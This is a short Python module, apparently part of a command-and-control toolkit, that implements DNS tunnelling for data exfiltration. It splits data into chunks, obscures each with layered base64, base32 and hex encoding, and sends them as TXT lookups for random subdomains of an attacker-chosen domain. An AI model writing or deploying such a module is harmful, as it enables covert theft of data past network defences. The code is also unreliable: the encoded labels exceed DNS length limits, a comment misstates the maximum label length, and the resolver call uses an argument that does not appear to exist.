# src/operators/c2_protocols/dns_tunneling.py
import dns.resolver
import base64
import random

class DNSTunnel:
    def __init__(self, domain="test.internal"):
        self.nameservers = ["1.1.1.1", "8.8.8.8"]
        self.domain = domain
        self.subdomains = ["cdn", "api", "assets"]

    def _encode(self, data: bytes) -> str:
        """Base64 -> Base32 -> Hex layered encoding"""
        return base64.b32encode(base64.b64encode(data)).hex()

    def exfil(self, data: bytes):
        chunk_size = 48  # Max DNS label length
        for i in range(0, len(data), chunk_size):
            sub = random.choice(self.subdomains)
            host = f"{self._encode(data[i:i+chunk_size])}.{sub}.{self.domain}"
            try:
                dns.resolver.resolve(host, 'TXT', nameserver=self.nameservers)
            except dns.exception.DNSException:
                pass